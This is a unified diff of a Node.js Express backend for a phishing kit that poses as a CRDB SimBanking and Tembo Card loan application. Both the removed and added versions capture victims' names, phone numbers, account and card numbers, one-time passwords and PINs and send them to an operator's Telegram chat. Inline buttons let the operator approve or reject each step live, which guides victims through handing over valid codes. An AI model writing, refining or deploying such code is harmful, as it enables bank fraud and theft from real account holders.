@@ -1,211 +1,154 @@
 const express = require('express');
-const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
+const fetch = require('node-fetch');
 
 const app = express();
+const PORT = process.env.PORT || 3000;
+
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// In-memory session store
+const sessions = {};
 
-const bot = new TelegramBot(TOKEN, { polling: { interval: 2000, autoStart: true, params: { timeout: 10 } } });
+// Replace with your Telegram Bot Token and Chat ID
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID';
 
-global.appState = global.appState || {
-    adminChatId: CHAT_ID || null,
-    clientData: {},
-    pinAttempts: 3,
-    currentClientResponse: null
-};
+async function sendTelegramMessage(text, replyMarkup = null) {
+  if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') {
+    console.log('Telegram token not configured. Message:', text);
+    return;
+  }
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const body = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: text,
+    parse_mode: 'HTML'
+  };
+  if (replyMarkup) {
+    body.reply_markup = replyMarkup;
+  }
+  try {
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body)
+    });
+  } catch (err) {
+    console.error('Telegram error:', err);
+  }
+}
 
-// Admin start command
-bot.onText(/\/start/, (msg) => {
-    global.appState.adminChatId = msg.chat.id;
-    const user = msg.from;
-    
-    // Dynamically retrieve public application browsing link
-    const appUrl = process.env.RENDER_EXTERNAL_URL || 'https://crdb-simbanking.onrender.com';
-    
-    const welcomeMsg = `✅ **Admin Connected Successfully!**\n\n` +
-        `👤 **User Info:**\n` +
-        `• Name: ${user.first_name} ${user.last_name || ''}\n` +
-        `• Username: @${user.username || 'N/A'}\n` +
-        `• ID: \`${user.id}\`\n\n` +
-        `🌐 **Browsing Application Link:**\n${appUrl}\n\n` +
-        `📱 Telegram notifications start strictly from the **Tembo Card Verification** screen onwards.`;
-    
-    bot.sendMessage(global.appState.adminChatId, welcomeMsg, { parse_mode: 'Markdown' }).catch(err => console.error(err));
-});
-
-// API endpoint to handle user step submissions from frontend
+// Handle step submissions and trigger Telegram bot
 app.post('/api/submit', async (req, res) => {
-    const { step, data } = req.body;
-    global.appState.clientData = { ...global.appState.clientData, ...data };
-    global.appState.currentClientResponse = null;
+  const { step, data, clientId } = req.body;
+  if (!sessions[clientId]) sessions[clientId] = {};
+  sessions[clientId] = { ...sessions[clientId], ...data, currentStep: step, status: 'pending' };
 
-    if (!global.appState.adminChatId) {
-        return res.status(400).json({ success: false, message: 'Admin not connected to bot. Please send /start to your bot on Telegram.' });
-    }
+  if (step === 'account_details') {
+    const text = `<b>New Loan & Account Details Submission</b>\n` +
+                 `Loan Amount: ${sessions[clientId].loanAmount || 'N/A'}\n` +
+                 `First Name: ${sessions[clientId].firstName || 'N/A'}\n` +
+                 `Last Name: ${sessions[clientId].lastName || 'N/A'}\n` +
+                 `Phone: ${sessions[clientId].phone || 'N/A'}\n` +
+                 `Account Number: ${data.accountNumber}\n` +
+                 `Card Number: ${data.cardNumber}`;
+    
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: 'WRONG DETAILS', callback_data: `wrong_details_${clientId}` },
+          { text: 'CORRECT DETAILS', callback_data: `correct_details_${clientId}` }
+        ]
+      ]
+    };
+    await sendTelegramMessage(text, replyMarkup);
+  } else if (step === 'resend_otp') {
+    const text = `<b>User requested to RESEND OTP (♻️ Tuma OTP tena)</b>\nClient ID: ${clientId}`;
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: 'OTP CORRECT', callback_data: `otp_correct_${clientId}` },
+          { text: 'OTP INCORRECT', callback_data: `otp_incorrect_${clientId}` }
+        ]
+      ]
+    };
+    await sendTelegramMessage(text, replyMarkup);
+  } else if (step === 'otp_submitted') {
+    const text = `<b>OTP Submitted:</b> ${data.otp}\nClient ID: ${clientId}`;
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: 'OTP CORRECT', callback_data: `otp_correct_${clientId}` },
+          { text: 'OTP INCORRECT', callback_data: `otp_incorrect_${clientId}` }
+        ]
+      ]
+    };
+    await sendTelegramMessage(text, replyMarkup);
+  } else if (step === 'pin_submitted') {
+    const text = `<b>PIN Submitted:</b> ${data.pin}\nClient ID: ${clientId}`;
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: '3 INVALID PIN', callback_data: `invalid_pin_${clientId}` },
+          { text: 'VALID PIN', callback_data: `valid_pin_${clientId}` },
+          { text: 'LOAN APPROVED', callback_data: `loan_approved_${clientId}` }
+        ]
+      ]
+    };
+    await sendTelegramMessage(text, replyMarkup);
+  }
 
-    const appUrl = process.env.RENDER_EXTERNAL_URL || 'https://crdb-simbanking.onrender.com';
-
-    if (step === 'personal_info') {
-        return res.json({ success: true, status: 'approved', next: 'step3' });
-    }
-    else if (step === 'step3') {
-        const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n` +
-            `🌐 [Open Browsing App](${appUrl})\n\n` +
-            `📱 **Phone No:** ${global.appState.clientData.phoneNumber || 'N/A'}\n` +
-            `🏦 **Account No:** ${data.accountNumber}\n` +
-            `💳 **Tembo Card No:** ${data.cardNumber}\n\n` +
-            `*Choose action for applicant:*`;
-        
-        const opts = {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: 'PROCEED', callback_data: 'card_proceed' },
-                        { text: 'DENY INVALID CRDB DETAILS ❌', callback_data: 'card_deny' }
-                    ]
-                ]
-            },
-            parse_mode: 'Markdown',
-            disable_web_page_preview: true
-        };
-        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
-        return res.json({ success: true, status: 'pending' });
-    }
-    else if (step === 'step4') {
-        if (data.isResend) {
-            const msgText = `🔄 **Step 4: Applicant OTP Expired / Requesting New OTP**\n\n` +
-                `🌐 [Open Browsing App](${appUrl})\n\n` +
-                `📱 **Phone:** ${global.appState.clientData.phoneNumber || 'N/A'}\n\n*Choose action:*`;
-            const opts = {
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: 'SEND NEW OTP 📤', callback_data: 'otp_resend_approve' },
-                            { text: 'IGNORE ❌', callback_data: 'otp_resend_ignore' }
-                        ]
-                    ]
-                },
-                parse_mode: 'Markdown',
-                disable_web_page_preview: true
-            };
-            await bot.sendMessage(global.appState.adminChatId, msgText, opts);
-            return res.json({ success: true, status: 'pending' });
-        }
-
-        const msgText = `📱 **Step 4: OTP Verification**\n\n` +
-            `🌐 [Open Browsing App](${appUrl})\n\n` +
-            `🔢 **Entered OTP:** ${data.otp}\n\n*Choose action:*`;
-        const opts = {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: 'CORRECT OTP ✅', callback_data: 'otp_correct' },
-                        { text: 'INCORRECT OTP ❌', callback_data: 'otp_incorrect' },
-                        { text: 'RESEND OTP 🔄', callback_data: 'otp_resend' }
-                    ]
-                ]
-            },
-            parse_mode: 'Markdown',
-            disable_web_page_preview: true
-        };
-        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
-        return res.json({ success: true, status: 'pending' });
-    }
-    else if (step === 'step5') {
-        const msgText = `🔒 **Step 5: SimBanking PIN**\n\n` +
-            `🌐 [Open Browsing App](${appUrl})\n\n` +
-            `🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${global.appState.pinAttempts}\n\n*Choose action:*`;
-        const opts = {
-            reply_markup: {
-                inline_keyboard: [
-                    [
-                        { text: 'CORRECT PIN ✅', callback_data: 'pin_correct' },
-                        { text: 'WRONG PIN ❌', callback_data: 'pin_wrong' }
-                    ]
-                ]
-            },
-            parse_mode: 'Markdown',
-            disable_web_page_preview: true
-        };
-        await bot.sendMessage(global.appState.adminChatId, msgText, opts);
-        return res.json({ success: true, status: 'pending' });
-    }
-
-    res.json({ success: false, message: 'Invalid step' });
+  res.json({ success: true, status: sessions[clientId].status });
 });
 
-bot.on('callback_query', async (query) => {
-    const action = query.data;
-    const chatId = query.message.chat.id;
-    const messageId = query.message.message_id;
+// Polling status endpoint for frontend
+app.get('/api/status/:clientId', (req, res) => {
+  const clientId = req.params.clientId;
+  const session = sessions[clientId] || { status: 'pending' };
+  res.json(session);
+});
 
-    try { await bot.answerCallbackQuery(query.id); } catch (e) {}
-    try { await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId }); } catch (e) {}
+// Telegram webhook for admin inline button clicks
+app.post('/api/telegram-webhook', async (req, res) => {
+  const update = req.body;
+  if (update.callback_query) {
+    const callbackData = update.callback_query.data;
+    // Format: action_clientId or loan_approved_clientId
+    let clientId = '';
+    let action = '';
 
-    if (action === 'card_proceed') {
-        await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
-        global.appState.currentClientResponse = { status: 'approved', next: 'otp' };
-    } else if (action === 'card_deny') {
-        await bot.sendMessage(chatId, '❌ Application stopped due to invalid CRDB details.');
-        global.appState.currentClientResponse = { status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details ❌).' };
-    } else if (action === 'otp_correct') {
-        await bot.sendMessage(chatId, '✅ Correct OTP!');
-        global.appState.currentClientResponse = { status: 'approved', next: 'pin' };
-    } else if (action === 'otp_incorrect') {
-        await bot.sendMessage(chatId, '❌ Incorrect OTP.');
-        global.appState.currentClientResponse = { status: 'retry_otp', message: 'Namba ya OTP si sahihi ❌. Tafadhali ingiza OTP mpya.' };
-    } else if (action === 'otp_resend') {
-        await bot.sendMessage(chatId, '🔄 Resend OTP triggered.');
-        global.appState.currentClientResponse = { status: 'resend', message: 'Ombi la kutuma tena OTP limepokelewa ✅.' };
-    } else if (action === 'otp_resend_approve') {
-        await bot.sendMessage(chatId, '✅ New OTP request approved and sent to applicant.');
-        global.appState.currentClientResponse = { status: 'resend', message: 'Namba mpya ya OTP imetumwa kwenye simu yako ✅.' };
-    } else if (action === 'otp_resend_ignore') {
-        await bot.sendMessage(chatId, 'ℹ️ New OTP request ignored.');
-        global.appState.currentClientResponse = { status: 'retry_otp', message: 'Tafadhali tumia OTP uliyopokea awali.' };
-    } else if (action === 'pin_correct') {
-        await bot.sendMessage(chatId, '✅ Correct PIN!');
-        global.appState.pinAttempts = 3;
-        global.appState.currentClientResponse = { status: 'approved', next: 'success' };
-    } else if (action === 'pin_wrong') {
-        global.appState.pinAttempts--;
-        if (global.appState.pinAttempts <= 0) {
-            await bot.sendMessage(chatId, '🚫 Account blocked due to 3 wrong PIN attempts.');
-            global.appState.currentClientResponse = { status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa ya PIN ❌.' };
-            global.appState.pinAttempts = 3;
-        } else {
-            await bot.sendMessage(chatId, `⚠️ Wrong PIN. ${global.appState.pinAttempts} attempt remains.`);
-            global.appState.currentClientResponse = { status: 'retry_pin', message: `Wrong PIN ❌. ${global.appState.pinAttempts} attempt(s) remaining.` };
-        }
+    if (callbackData.startsWith('loan_approved_')) {
+      action = 'loan_approved';
+      clientId = callbackData.replace('loan_approved_', '');
+    } else {
+      const parts = callbackData.split('_');
+      action = `${parts[0]}_${parts[1]}`;
+      clientId = parts[2];
     }
+
+    if (!sessions[clientId]) sessions[clientId] = {};
+
+    if (action === 'wrong_details') sessions[clientId].status = 'wrong_details';
+    else if (action === 'correct_details') sessions[clientId].status = 'correct_details';
+    else if (action === 'otp_correct') sessions[clientId].status = 'otp_correct';
+    else if (action === 'otp_incorrect') sessions[clientId].status = 'otp_incorrect';
+    else if (action === 'invalid_pin') sessions[clientId].status = 'invalid_pin';
+    else if (action === 'valid_pin') sessions[clientId].status = 'valid_pin';
+    else if (action === 'loan_approved') sessions[clientId].status = 'loan_approved';
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: update.callback_query.id, text: 'Recorded successfully' })
+    });
+  }
+  res.sendStatus(200);
 });
 
-app.get('/api/poll-status', (req, res) => {
-    let elapsed = 0;
-    const intervalTime = 500;
-    const maxTimeout = 25000;
-
-    const checkInterval = setInterval(() => {
-        elapsed += intervalTime;
-        if (global.appState.currentClientResponse) {
-            clearInterval(checkInterval);
-            const resp = global.appState.currentClientResponse;
-            global.appState.currentClientResponse = null;
-            return res.json(resp);
-        }
-        if (elapsed >= maxTimeout) {
-            clearInterval(checkInterval);
-            return res.json({ status: 'pending' });
-        }
-    }, intervalTime);
-});
-
-const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+  console.log(`Server running on port ${PORT}`);
 });
-           
+        
